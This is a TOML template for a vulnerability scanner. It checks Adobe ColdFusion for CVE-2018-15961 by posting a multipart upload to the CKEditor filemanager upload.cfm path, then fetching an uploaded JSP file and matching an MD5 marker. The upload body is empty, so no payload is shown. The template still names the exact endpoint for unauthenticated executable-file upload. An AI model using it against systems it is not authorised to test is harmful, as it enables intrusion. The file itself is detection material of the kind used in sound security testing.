[info]
author = "AVE"
description = "通过向 /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm 发送多部分表单上传请求，上传一个计算 CVE-2018-15961 字符串 MD5 哈希值的 JSP 文件，然后访问上传后的文件路径验证 MD5 输出 ddbb3e76f92e78c445c8ecb392beb225，确认漏洞存在。该检测方式安全无损，仅验证文件上传能力。"
id = "POC-AVE-2018-0408"
name = "Adobe ColdFusion 任意文件上传漏洞 PoC"
severity = "critical"
tags = ["ave-2018-0408"]
vuln_id = [
    "CVE-2018-15961",
    "AVE-2018-0408",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
protocol = "http"

[poc.requests.body]
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=---------------------------24464570528145"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ddbb3e76f92e78c445c8ecb392beb225"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
